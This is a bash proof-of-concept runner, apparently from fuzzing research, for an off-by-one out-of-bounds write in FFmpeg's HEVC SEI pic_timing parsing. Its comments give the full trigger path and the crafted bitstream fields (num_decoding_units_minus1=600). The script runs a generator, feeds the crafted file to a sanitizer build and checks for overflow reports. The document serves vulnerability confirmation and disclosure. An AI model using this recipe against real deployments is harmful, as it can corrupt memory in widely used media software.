#!/bin/bash
# PoC runner for VULN 001: Off-by-one OOB Write in SEI pic_timing DU loop
# CVE: TBD
# File: libavcodec/cbs_h265_syntax_template.c :: FUNC(sei_pic_timing)
#
# Trigger path:
#   ffmpeg -f hevc -i <crafted.hevc> -c:v copy -bsf:v trace_headers -f null -
#   → HEVC demuxer (hevc raw format)
#   → trace_headers BSF uses CBS to process packets
#   → ff_cbs_read_packet() → cbs_h265_read_nal_unit() [HEVC_NAL_SEI_PREFIX]
#   → cbs_h265_read_sei() → cbs_h265_read_sei_pic_timing()
#   → OOB write: num_nalus_in_du_minus1[600] (array size = 600)
#
# The bitstream contains:
#   VPS  → parameter set (goes to extradata, CBS processes it)
#   SPS  → parameter set with VUI HRD: sub_pic_hrd=1, sub_pic_cpb_timing=1
#   PPS  → references SPS 0; CBS sets active_sps when parsed
#   SEI_PREFIX (type 39) → pic_timing with num_decoding_units_minus1=600
#   IDR_W_RADL (type 19) → minimal stub to make demuxer produce a packet
#   AUD  (type 35) → signals next AU start, forces packet flush
#
# The CBS processes the first packet (SEI + IDR) when the AUD triggers
# the packet boundary.  pic_timing is parsed, num_decoding_units_minus1=600
# is read, and the loop i=0..600 writes num_nalus_in_du_minus1[600] OOB.
#
# Detection: ASAN heap-buffer-overflow or UBSan index-out-of-bounds.
# Note: The OOB write is INTRA-STRUCT (num_nalus_in_du_minus1[600] lands
# in du_cpb_removal_delay_increment_minus1[0]'s first 2 bytes), so ASAN
# may not crash but UBSan will report the bounds violation.

set -uo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
INPUT=vuln_001_input.hevc

echo "[*] Generating crafted HEVC bitstream..."
python3 vuln_001_gen.py

echo ""
echo "[*] Running FFmpeg with trace_headers BSF (CBS path) to trigger OOB write..."
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log:detect_odr_violation=0" \
  "$BIN" -f hevc -i "$INPUT" -c:v copy -bsf:v trace_headers -f null - \
  2>&1 | tee vuln_001_run_output.txt || true

# Collect any ASAN output
echo ""
if ls asan.log.* >/dev/null 2>&1; then
    echo "[*] ASAN crash log found:"
    cat asan.log.*
    cat asan.log.* >> vuln_001_run_output.txt 2>/dev/null
else
    echo "[*] No ASAN crash log (asan.log.*) found"
fi

# Check for UBSan or ASAN output in the run output
echo ""
echo "[*] Checking for vulnerability evidence..."
if grep -qE "runtime error|index.*out of bounds|heap-buffer-overflow|SUMMARY: AddressSanitizer|SUMMARY: UndefinedBehaviorSanitizer" vuln_001_run_output.txt 2>/dev/null; then
    echo "[!] VULNERABILITY CONFIRMED: OOB write detected!"
    grep -E "runtime error|index.*out of bounds|heap-buffer-overflow|SUMMARY:" vuln_001_run_output.txt
elif grep -qE "Picture Timing|num_decoding_units_minus1.*= 600" vuln_001_run_output.txt 2>/dev/null; then
    echo "[!] BEHAVIOR CONFIRMED: SEI pic_timing with num_decoding_units_minus1=600 was parsed"
    grep -E "Picture Timing|num_decoding_units_minus1" vuln_001_run_output.txt
else
    echo "[?] Could not confirm trigger. Check vuln_001_run_output.txt for details."
fi

echo ""
echo "[*] Done."
